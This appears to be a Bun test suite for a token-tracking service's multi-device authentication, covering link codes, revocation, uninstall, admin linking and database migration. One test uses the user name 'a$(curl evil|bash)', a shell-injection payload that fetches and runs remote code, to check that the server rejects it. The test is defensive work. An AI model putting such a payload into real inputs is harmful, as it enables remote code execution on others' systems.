// Multi-device: one user, many machines. Covers the user_devices migration
// seed, device auth on /ingest, link-code mint/redeem, per-device revocation
// and uninstall semantics, the admin escape hatch, and the per-device fleet.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { Database } from "bun:sqlite";
import { createHash } from "node:crypto";
import { join } from "node:path";
import { createTestApp, jsonOf, makeTmpDirSync, makeTokenEvent } from "../test-helpers.ts";
import type { TokenEvent } from "../types.ts";
import { Store } from "./db.ts";

const LAPTOP_SECRET = "machine-a-secret";
const DESKTOP_SECRET = "machine-b-secret";
const INTRUDER_SECRET = "intruder-secret";

function sha256Hex(s: string): string {
  return createHash("sha256").update(s).digest("hex");
}

let harness: ReturnType<typeof createTestApp>;
let app: ReturnType<typeof createTestApp>["app"];
let store: ReturnType<typeof createTestApp>["store"];

beforeAll(() => {
  harness = createTestApp({ adminToken: "admin-tok" });
  app = harness.app;
  store = harness.store;
});

afterAll(async () => {
  await harness.cleanup();
});

let msgCounter = 0;
const makeEvent = (user: string): TokenEvent =>
  makeTokenEvent({ user, messageId: `dev-msg-${msgCounter++}` });

function ingestReq(user: string, secret: string, headers: Record<string, string> = {}): Request {
  return new Request("http://x/ingest", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-tokenleader-secret": secret,
      ...headers,
    },
    body: JSON.stringify({ events: [makeEvent(user)] }),
  });
}

function mintReq(user: string, secret: string): Request {
  return new Request("http://x/devices/link", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-tokenleader-secret": secret,
    },
    body: JSON.stringify({ user }),
  });
}

async function mintCode(user: string, secret: string): Promise<string> {
  const res = await app.request(mintReq(user, secret));
  expect(res.status).toBe(200);
  const body = await jsonOf(res);
  expect(body.code).toMatch(/^[A-Z0-9]{4}-[A-Z0-9]{4}$/);
  expect(body.command).toContain(`--name=${user}`);
  expect(body.command).toContain(`--link=${body.code}`);
  return body.code as string;
}

describe("multi-device /ingest auth", () => {
  test("a second machine with its own secret is rejected (no link code)", async () => {
    const first = await app.request(ingestReq("dana", LAPTOP_SECRET));
    expect(first.status).toBe(200);
    const second = await app.request(ingestReq("dana", DESKTOP_SECRET));
    expect(second.status).toBe(403);
    expect((await jsonOf(second)).error).toContain("secret mismatch");
  });

  test("a bogus link code is a distinct 403 (so the daemon can hint)", async () => {
    const res = await app.request(
      ingestReq("dana", DESKTOP_SECRET, { "x-tokenleader-link": "NOPE-NOPE" }),
    );
    expect(res.status).toBe(403);
    expect((await jsonOf(res)).error).toContain("link code invalid or expired");
  });

  test("link flow: mint on machine A, redeem on machine B, both post", async () => {
    const code = await mintCode("dana", LAPTOP_SECRET);
    // Redemption is case/punctuation-insensitive.
    const redeem = await app.request(
      ingestReq("dana", DESKTOP_SECRET, {
        "x-tokenleader-link": code.toLowerCase(),
        "x-tokenleader-device": "Studio-Desktop",
      }),
    );
    expect(redeem.status).toBe(200);
    // Both machines keep posting with their own secrets.
    expect((await app.request(ingestReq("dana", LAPTOP_SECRET))).status).toBe(200);
    expect((await app.request(ingestReq("dana", DESKTOP_SECRET))).status).toBe(200);
    // The stale link header on later posts is inert (code consumed).
    const stale = await app.request(
      ingestReq("dana", DESKTOP_SECRET, { "x-tokenleader-link": code }),
    );
    expect(stale.status).toBe(200);
  });

  test("a consumed code can't authorize a third machine", async () => {
    const code = await mintCode("dana", LAPTOP_SECRET);
    const r1 = await app.request(
      ingestReq("dana", "third-machine-secret", { "x-tokenleader-link": code }),
    );
    expect(r1.status).toBe(200);
    const r2 = await app.request(
      ingestReq("dana", "fourth-machine-secret", { "x-tokenleader-link": code }),
    );
    expect(r2.status).toBe(403);
  });

  test("a code minted for one user can't link a machine to another user", async () => {
    await app.request(ingestReq("erin", "erin-secret"));
    const danaCode = await mintCode("dana", LAPTOP_SECRET);
    const res = await app.request(
      ingestReq("erin", INTRUDER_SECRET, { "x-tokenleader-link": danaCode }),
    );
    expect(res.status).toBe(403);
  });

  test("minting requires a valid device secret", async () => {
    const res = await app.request(mintReq("dana", INTRUDER_SECRET));
    expect(res.status).toBe(403);
  });

  test("events from all linked machines aggregate under the one user", async () => {
    const res = await app.request(new Request("http://x/stats/admin"));
    const body = await jsonOf(res);
    const dana = body.leaderboard.find((r: { user: string }) => r.user === "dana");
    // 1 claim + 1 redeem + 2 keep-posting + 1 stale-header + 1 third-machine
    expect(dana.eventCount).toBeGreaterThanOrEqual(6);
  });
});

describe("/devices list + revoke", () => {
  test("lists active devices with labels and the `current` marker", async () => {
    const res = await app.request(
      new Request("http://x/devices?user=dana", {
        headers: { "x-tokenleader-secret": DESKTOP_SECRET },
      }),
    );
    expect(res.status).toBe(200);
    const body = await jsonOf(res);
    expect(body.user).toBe("dana");
    expect(body.devices.length).toBe(3);
    const current = body.devices.filter((d: { current: boolean }) => d.current);
    expect(current.length).toBe(1);
    expect(current[0].label).toBe("studio-desktop");
    // No hashes anywhere in the payload.
    expect(JSON.stringify(body)).not.toContain(sha256Hex(DESKTOP_SECRET));
  });

  test("listing requires a valid device secret", async () => {
    const res = await app.request(
      new Request("http://x/devices?user=dana", {
        headers: { "x-tokenleader-secret": INTRUDER_SECRET },
      }),
    );
    expect(res.status).toBe(403);
  });

  test("revoking a device locks it out; the user stays installed", async () => {
    const list = await jsonOf(
      await app.request(
        new Request("http://x/devices?user=dana", {
          headers: { "x-tokenleader-secret": LAPTOP_SECRET },
        }),
      ),
    );
    const third = list.devices.find(
      (d: { label: string | null; current: boolean }) => !d.current && d.label === null,
    );
    const res = await app.request(
      new Request("http://x/devices/revoke", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "x-tokenleader-secret": LAPTOP_SECRET,
        },
        body: JSON.stringify({ user: "dana", deviceId: third.id }),
      }),
    );
    expect(res.status).toBe(200);
    expect((await jsonOf(res)).uninstalled).toBe(false);
    // The revoked machine's secret no longer authenticates...
    expect((await app.request(ingestReq("dana", "third-machine-secret"))).status).toBe(403);
    // ...and the survivors still do.
    expect((await app.request(ingestReq("dana", LAPTOP_SECRET))).status).toBe(200);
    expect(store.listUninstalledUsers().find((u) => u.user === "dana")).toBeUndefined();
  });

  test("revoking an already-revoked or unknown device is a 404", async () => {
    const res = await app.request(
      new Request("http://x/devices/revoke", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "x-tokenleader-secret": LAPTOP_SECRET,
        },
        body: JSON.stringify({ user: "dana", deviceId: 999_999 }),
      }),
    );
    expect(res.status).toBe(404);
  });
});

describe("per-device uninstall semantics", () => {
  test("uninstalling one of N machines revokes only that device", async () => {
    const res = await app.request(
      new Request("http://x/events/uninstall", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "x-tokenleader-secret": DESKTOP_SECRET,
        },
        body: JSON.stringify({ user: "dana" }),
      }),
    );
    expect(res.status).toBe(200);
    const body = await jsonOf(res);
    // Other machines remain → NOT uninstalled.
    expect(body.uninstalledAt).toBe(null);
    expect((await app.request(ingestReq("dana", DESKTOP_SECRET))).status).toBe(403);
    expect((await app.request(ingestReq("dana", LAPTOP_SECRET))).status).toBe(200);
  });

  test("uninstalling the LAST machine marks the user uninstalled", async () => {
    const res = await app.request(
      new Request("http://x/events/uninstall", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "x-tokenleader-secret": LAPTOP_SECRET,
        },
        body: JSON.stringify({ user: "dana" }),
      }),
    );
    expect(res.status).toBe(200);
    expect((await jsonOf(res)).uninstalledAt).not.toBe(null);
    expect(store.listUninstalledUsers().some((u) => u.user === "dana")).toBe(true);
  });

  test("an uninstalled user is reclaimable by a fresh machine (TOFU reinstall)", async () => {
    const res = await app.request(ingestReq("dana", "fresh-reinstall-secret"));
    expect(res.status).toBe(200);
    expect(store.listUninstalledUsers().some((u) => u.user === "dana")).toBe(false);
    // The reclaim revoked every pre-uninstall device.
    expect((await app.request(ingestReq("dana", LAPTOP_SECRET))).status).toBe(403);
    expect(store.listUserDevices("dana").length).toBe(1);
  });
});

describe("POST /admin/link", () => {
  test("mints a code with the admin bearer (no device secret needed)", async () => {
    const res = await app.request(
      new Request("http://x/admin/link", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          authorization: "Bearer admin-tok",
        },
        body: JSON.stringify({ user: "dana" }),
      }),
    );
    expect(res.status).toBe(200);
    const body = await jsonOf(res);
    // The admin-minted code links a machine like any other.
    const redeem = await app.request(
      ingestReq("dana", "lost-laptop-replacement", { "x-tokenleader-link": body.code }),
    );
    expect(redeem.status).toBe(200);
  });

  test("rejects a bad bearer and unknown users", async () => {
    const bad = await app.request(
      new Request("http://x/admin/link", {
        method: "POST",
        headers: { "content-type": "application/json", authorization: "Bearer wrong" },
        body: JSON.stringify({ user: "dana" }),
      }),
    );
    expect(bad.status).toBe(403);
    const unknown = await app.request(
      new Request("http://x/admin/link", {
        method: "POST",
        headers: { "content-type": "application/json", authorization: "Bearer admin-tok" },
        body: JSON.stringify({ user: "nobody-here" }),
      }),
    );
    expect(unknown.status).toBe(404);
  });
});

describe("device labels", () => {
  test("labels are slugified and deduped per user", async () => {
    await app.request(ingestReq("filip", "filip-1", { "x-tokenleader-device": "MBP.local" }));
    const code = await mintCode("filip", "filip-1");
    await app.request(
      ingestReq("filip", "filip-2", {
        "x-tokenleader-link": code,
        "x-tokenleader-device": "MBP.local",
      }),
    );
    const labels = store.listUserDevices("filip").map((d) => d.label);
    expect(labels).toEqual(["mbp.local", "mbp.local-2"]);
  });
});

describe("/stats/fleet per-device", () => {
  function fleetIngest(user: string, secret: string, version: string, device: string): Request {
    return ingestReq(user, secret, {
      "x-tokenleader-version": version,
      "x-tokenleader-arch": "arm64",
      "x-tokenleader-device": device,
    });
  }

  test("a user is `latest` only when EVERY reporting device is", async () => {
    // createTestApp has no mirror → latestVersion null → isLatest null; we
    // only assert the devices array shape here. Version comparison against
    // a real manifest is covered by the existing fleet tests in
    // main.test.ts, which now run through the same per-device path.
    await app.request(fleetIngest("gita", "gita-1", "v9.9.9", "mbp"));
    const code = await mintCode("gita", "gita-1");
    await app.request(
      ingestReq("gita", "gita-2", {
        "x-tokenleader-link": code,
        "x-tokenleader-version": "v1.0.0",
        "x-tokenleader-arch": "x64",
        "x-tokenleader-device": "imac",
      }),
    );
    const body = await jsonOf(await app.request(new Request("http://x/stats/fleet")));
    const gita = body.fleet.find((f: { user: string }) => f.user === "gita");
    expect(gita.devices.length).toBe(2);
    expect(gita.devices.map((d: { label: string }) => d.label).sort()).toEqual(["imac", "mbp"]);
    // Top-level row mirrors the most recently seen reporting device.
    expect(gita.version).toBe("v1.0.0");
    expect(gita.reporting).toBe(true);
  });
});

describe("revocation is durable (no daemon resurrection)", () => {
  test("a revoked-last machine's still-running daemon cannot re-claim the handle", async () => {
    const built = createTestApp();
    try {
      const a = built.app;
      const SEC = "solo-machine-secret";
      expect((await a.request(ingestReq("hank", SEC))).status).toBe(200);
      const dev = built.store.listUserDevices("hank")[0]!;
      // Self-revoke the only device via the deliberate revoke path.
      const rev = await a.request(
        new Request("http://x/devices/revoke", {
          method: "POST",
          headers: { "content-type": "application/json", "x-tokenleader-secret": SEC },
          body: JSON.stringify({ user: "hank", deviceId: dev.id }),
        }),
      );
      expect((await jsonOf(rev)).uninstalled).toBe(true);
      // The SAME secret's next ingest must NOT resurrect the handle (barred),
      // even though the user is now uninstalled.
      expect((await a.request(ingestReq("hank", SEC))).status).toBe(403);
      expect(built.store.listUserDevices("hank").length).toBe(0);
      // A genuinely fresh secret still re-claims (normal reinstall).
      expect((await a.request(ingestReq("hank", "brand-new-secret"))).status).toBe(200);
    } finally {
      await built.cleanup();
    }
  });

  test("deferred case: a stolen machine revoked while a sibling exists can't resurrect after the sibling leaves", async () => {
    const built = createTestApp();
    try {
      const a = built.app;
      const STOLEN = "stolen-laptop-secret";
      const KEEP = "trusted-desktop-secret";
      expect((await a.request(ingestReq("ivy", STOLEN))).status).toBe(200);
      const code = await (async () => {
        const res = await a.request(mintReq("ivy", STOLEN));
        return (await jsonOf(res)).code as string;
      })();
      expect((await a.request(ingestReq("ivy", KEEP, { "x-tokenleader-link": code }))).status).toBe(
        200,
      );
      // Revoke the stolen machine (the oldest device; sibling remains → the
      // lockout holds and the user is NOT yet uninstalled).
      const stolenId = built.store
        .listUserDevices("ivy")
        .sort((x, y) => x.addedAt - y.addedAt)[0]!.id;
      await a.request(
        new Request("http://x/devices/revoke", {
          method: "POST",
          headers: { "content-type": "application/json", "x-tokenleader-secret": KEEP },
          body: JSON.stringify({ user: "ivy", deviceId: stolenId }),
        }),
      );
      expect((await a.request(ingestReq("ivy", STOLEN))).status).toBe(403);
      // Now the trusted desktop uninstalls (last device → uninstalled_at set).
      await a.request(
        new Request("http://x/events/uninstall", {
          method: "POST",
          headers: { "content-type": "application/json", "x-tokenleader-secret": KEEP },
          body: JSON.stringify({ user: "ivy" }),
        }),
      );
      // The stolen machine's daemon must STILL be barred from resurrecting.
      expect((await a.request(ingestReq("ivy", STOLEN))).status).toBe(403);
    } finally {
      await built.cleanup();
    }
  });
});

describe("rollback drift reconciliation", () => {
  test("auth success clears a stale uninstalled_at (blocks stranger takeover)", async () => {
    const built = createTestApp({ adminToken: "tok" });
    try {
      const a = built.app;
      expect((await a.request(ingestReq("jo", "jo-laptop"))).status).toBe(200);
      const code = (await jsonOf(await a.request(mintReq("jo", "jo-laptop")))).code as string;
      expect(
        (await a.request(ingestReq("jo", "jo-desktop", { "x-tokenleader-link": code }))).status,
      ).toBe(200);
      // Simulate an OLD server (during a rollback window) marking the handle
      // uninstalled directly, while both device rows stay active.
      built.store.db
        .prepare("UPDATE user_secrets SET uninstalled_at = 12345 WHERE username = ?")
        .run("jo");
      expect(built.store.listUninstalledUsers().some((u) => u.user === "jo")).toBe(true);
      // A still-active device's next post must reconcile (clear the marker)...
      expect((await a.request(ingestReq("jo", "jo-laptop"))).status).toBe(200);
      expect(built.store.listUninstalledUsers().some((u) => u.user === "jo")).toBe(false);
      // ...and a stranger's fresh secret must NOT have been able to take over
      // in the meantime (the handle is owned, not reclaimable).
      expect((await a.request(ingestReq("jo", "stranger-secret"))).status).toBe(403);
    } finally {
      await built.cleanup();
    }
  });

  test("revoking the mirror device re-points user_secrets.secret_hash to a survivor", async () => {
    const built = createTestApp();
    try {
      const a = built.app;
      expect((await a.request(ingestReq("kev", "kev-A"))).status).toBe(200);
      // The claim mirrored A's hash into user_secrets.
      expect(built.store.getUserSecretHash("kev")).toBe(sha256Hex("kev-A"));
      const code = (await jsonOf(await a.request(mintReq("kev", "kev-A")))).code as string;
      expect(
        (await a.request(ingestReq("kev", "kev-B", { "x-tokenleader-link": code }))).status,
      ).toBe(200);
      // Retire machine A; B survives.
      await a.request(
        new Request("http://x/events/uninstall", {
          method: "POST",
          headers: { "content-type": "application/json", "x-tokenleader-secret": "kev-A" },
          body: JSON.stringify({ user: "kev" }),
        }),
      );
      // The mirror now points at B (the survivor), not the revoked A — so an
      // old server on rollback authenticates B.
      expect(built.store.getUserSecretHash("kev")).toBe(sha256Hex("kev-B"));
    } finally {
      await built.cleanup();
    }
  });
});

describe("handle charset is enforced server-side", () => {
  test("a raw POST can't claim a handle with shell metacharacters", async () => {
    const built = createTestApp();
    try {
      const res = await built.app.request(ingestReq("a$(curl evil|bash)", "metachar-secret"));
      expect(res.status).toBe(400);
      expect((await jsonOf(res)).error).toContain("user must match");
      expect(built.store.getUserSecretRow("a$(curl evil|bash)")).toBeNull();
    } finally {
      await built.cleanup();
    }
  });
});

describe("user_devices migration seed", () => {
  test("pre-multi-device rows are seeded with build info and uninstall state", () => {
    const { dir, cleanup } = makeTmpDirSync("tokenleader-devices-migration-");
    const dbPath = join(dir, "old.sqlite");
    try {
      // Hand-build the pre-v0.2 shape: user_secrets + daemon_status, no
      // user_devices.
      const raw = new Database(dbPath, { create: true });
      raw.exec(`
        CREATE TABLE user_secrets (
          username TEXT PRIMARY KEY, secret_hash TEXT NOT NULL,
          claimed_at INTEGER NOT NULL, uninstalled_at INTEGER, company TEXT
        );
        CREATE TABLE daemon_status (
          username TEXT PRIMARY KEY, version TEXT NOT NULL,
          arch TEXT, last_seen INTEGER NOT NULL
        );
        INSERT INTO user_secrets VALUES
          ('active-user', '${sha256Hex("active")}', 1000, NULL, 'anara.com'),
          ('gone-user',   '${sha256Hex("gone")}',   2000, 5000, NULL);
        INSERT INTO daemon_status VALUES ('active-user', 'v0.1.0', 'arm64', 4000);
      `);
      raw.close();

      const migrated = new Store(dbPath);
      try {
        const active = migrated.listUserDevices("active-user");
        expect(active.length).toBe(1);
        expect(active[0]!.version).toBe("v0.1.0");
        expect(active[0]!.arch).toBe("arm64");
        expect(active[0]!.lastSeen).toBe(4000);
        expect(active[0]!.addedAt).toBe(1000);
        // The seeded device authenticates exactly like before the upgrade.
        expect(migrated.authenticateDevice("active-user", sha256Hex("active"))).not.toBeNull();
        // Uninstalled users seed a REVOKED device — no active devices, so
        // the reclaim invariant holds.
        expect(migrated.listUserDevices("gone-user").length).toBe(0);
        // Re-opening doesn't double-seed.
        migrated.close();
        const reopened = new Store(dbPath);
        expect(reopened.listUserDevices("active-user").length).toBe(1);
        reopened.close();
      } finally {
        migrated.close();
      }
    } finally {
      cleanup();
    }
  });
});
